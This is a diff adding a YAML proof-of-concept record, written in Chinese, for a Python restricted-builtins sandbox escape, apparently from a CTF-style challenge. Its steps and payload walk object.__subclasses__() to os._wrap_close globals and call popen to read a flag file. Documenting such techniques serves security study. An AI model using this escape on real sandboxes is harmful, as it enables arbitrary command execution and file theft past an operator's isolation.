@@ -1,0 +1,25 @@
+info:
+  name: python-restricted-builtins-sandbox-escape
+  cve: ''
+  summary: Python 受限 __builtins__ 沙箱逃逸：通过 object.__subclasses__() 定位 os._wrap_close，用其
+    __init__.__globals__ 拿到 os 模块的 system/popen 执行命令
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: Python 受限 __builtins__ 沙箱逃逸：通过 object.__subclasses__() 定位 os._wrap_close，用其
+    __init__.__globals__ 拿到 os 模块的 system/popen 执行命令
+  steps:
+  - 1. 确认 __builtins__ 被限制（无 import/open/eval），但 print 可用
+  - 2. 确认 __class__.__mro__[-1].__subclasses__() 可用（属性链未过滤）
+  - 3. 遍历子类找 _wrap_close（os 模块内部类），其 __init__.__globals__ 即 os 模块命名空间
+  - 4. 用 globals["popen"]("cmd").read() 或 globals["system"]("cmd") 执行任意命令
+  - 5. 读取 /challenge/flag1.txt 等 flag 文件
+  payload: 'sc=().__class__.__mro__[-1].__subclasses__()
+
+    g=sc[141].__init__.__globals__   # _wrap_close 的 globals 即 os 模块命名空间
+
+    print(g["popen"]("cat /challenge/flag1.txt").read())'
+  verification: Python 受限 __builtins__ 沙箱逃逸：通过 object.__subclasses__() 定位 os._wrap_close，用其
+    __init__.__globals__ 拿到 os 模块的 system/popen 执行命令
